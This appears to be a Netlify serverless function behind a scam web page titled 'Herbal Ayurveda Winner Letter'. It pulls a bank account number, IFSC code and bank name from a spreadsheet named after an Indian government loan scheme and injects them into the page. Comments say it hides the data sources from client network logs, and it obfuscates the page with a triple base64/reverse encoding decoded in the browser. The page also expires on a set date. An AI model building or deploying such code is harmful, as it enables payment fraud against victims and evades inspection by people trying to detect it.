// netlify/functions/render.js
// Node 18+ runtime on Netlify supports global fetch and Buffer.
exports.handler = async function(event, context) {
  const expiryId = "TRL"; // same id you used in PHP
  const sheetbaseApiUrl = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
  const datetimeApiUrl  = "https://datetimeapi.vercel.app/api/datetime.js";

  try {
    // Fetch datetime (server-side so it will NOT appear in client network logs)
    const tRes = await fetch(datetimeApiUrl);
    if (!tRes.ok) {
      return {
        statusCode: 500,
        headers: { "Content-Type": "text/html" },
        body: "<h2>Datetime fetch error</h2>"
      };
    }
    // The vercel datetime endpoint returns JSON; try parse as JSON
    const tjson = await tRes.json();
    if (!tjson || !tjson.datetime) {
      return {
        statusCode: 500,
        headers: { "Content-Type": "text/html" },
        body: "<h2>Datetime error</h2>"
      };
    }
    const serverDatetime = tjson.datetime;

    // Fetch sheetbase JSON (server-side)
    const sRes = await fetch(sheetbaseApiUrl);
    if (!sRes.ok) {
      return {
        statusCode: 500,
        headers: { "Content-Type": "text/html" },
        body: "<h2>Sheetbase fetch error</h2>"
      };
    }
    const data = await sRes.json();

    // Find the entry
    let item = null;
    if (data && Array.isArray(data.data)) {
      for (const entry of data.data) {
        if (String(entry.id) === String(expiryId)) {
          item = entry;
          break;
        }
      }
    }
    if (!item) {
      return {
        statusCode: 500,
        headers: { "Content-Type": "text/html" },
        body: "<h2>Entry missing</h2>"
      };
    }

    // Compare expiry: serverDatetime and item.date
    // Use Date parsing like your PHP
    const serverDT = new Date(serverDatetime);
    const expiryDT = new Date(item.date);
    if (isNaN(serverDT) || isNaN(expiryDT)) {
      return {
        statusCode: 500,
        headers: { "Content-Type": "text/html" },
        body: "<h2>Datetime parse error</h2>"
      };
    }
    if (serverDT > expiryDT) {
      return {
        statusCode: 200,
        headers: { "Content-Type": "text/html" },
        body: "<h2>This Page is expired.</h2>"
      };
    }

    // Decode base64 fields (if present) exactly like your PHP did
    const decodedHTML = item.html ? Buffer.from(item.html, "base64").toString("utf8") : "";
    const decodedCSS  = item.css  ? Buffer.from(item.css,  "base64").toString("utf8") : "";
    const decodedJS   = item.init ? Buffer.from(item.init, "base64").toString("utf8") : "";

    // Build the "fullPage" same structure as your PHP version.
    // We'll inline CSS and JS so Netlify server returns a single payload,
    // and the client won't see the sheetbase or datetime URLs.
    const fullPage = `
<link rel='stylesheet' href="functions/style.css">
<script>
window.SERVER_EXPIRY = ${JSON.stringify(item.date)};
window.SERVER_TIME   = ${JSON.stringify(serverDatetime)};
window.SERVER_ACC    = ${JSON.stringify(item.acc ?? "")};
window.SERVER_IFSC   = ${JSON.stringify(item.ifsc ?? "")};
window.SERVER_BANK   = ${JSON.stringify(item.bank ?? "")};
</script>

<style>
${decodedCSS}
</style>

<script>
${decodedJS}
</script>

${decodedHTML}
`;

    // Triple-layer encode so client receives same behavior:
    // layerA = base64(fullPage)
    // layerB = reverse(layerA)
    // layerC = base64(layerB)
    const layerA = Buffer.from(fullPage, "utf8").toString("base64");
    const layerB = layerA.split("").reverse().join("");
    const layerC = Buffer.from(layerB, "utf8").toString("base64");

    // Construct the HTML that client will receive (same as your PHP final document)
    const finalResponse = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Herbal Ayurveda Winner Letter</title>
<script>
(function(){
    try {
        const payload = ${JSON.stringify(layerC)};
        const step1 = atob(payload);
        const step2 = step1.split('').reverse().join('');
        const finalHtml = atob(step2);
        document.open();
        document.write(finalHtml);
        document.close();
    } catch (e) {
        console.error('Decode error', e);
        document.open();
        document.write('<h2>Page load error</h2>');
        document.close();
    }
})();
</script>
</head>
<body></body>
</html>`;

    return {
      statusCode: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" },
      body: finalResponse
    };

  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      headers: { "Content-Type": "text/html" },
      body: "<h2>Server error</h2>"
    };
  }
};
